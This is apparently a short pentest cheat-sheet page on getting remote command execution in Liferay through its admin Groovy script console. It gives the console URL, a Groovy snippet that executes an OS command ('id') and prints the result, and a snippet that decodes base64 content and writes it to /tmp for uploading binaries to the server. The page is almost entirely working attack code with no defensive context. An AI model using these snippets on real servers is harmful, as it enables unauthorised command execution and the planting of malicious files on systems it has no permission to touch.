---
title: Liferay
category: Software
order: 7
---


# RCE from Goovy console

It is possible to achieve os command execution with goovy scripts.

http://localhost/group/control_panel/manage?p_p_id=com_liferay_server_admin_web_portlet_ServerAdminPortlet&p_p_lifecycle=0&p_p_state=maximized&p_p_mode=view&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_mvcRenderCommandName=%2Fserver_admin%2Fview&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_cur=0&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_tabs1=script&_com_liferay_server_admin_web_portlet_ServerAdminPortlet_delta=0

```
def sout = new StringBuilder(), serr = new StringBuilder()
def proc = 'id'.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println "out> $sout err> $serr"
```


Decode a base64 string and store it to a file, useful to upload binaries on the server.

```
def outputFile = new File("/tmp/test.txt") 
def base64Content = "<BASE64-CONTENT>" 
byte[] decodedBytes = Base64.decoder.decode(base64Content)
outputFile.bytes = decodedBytes
```
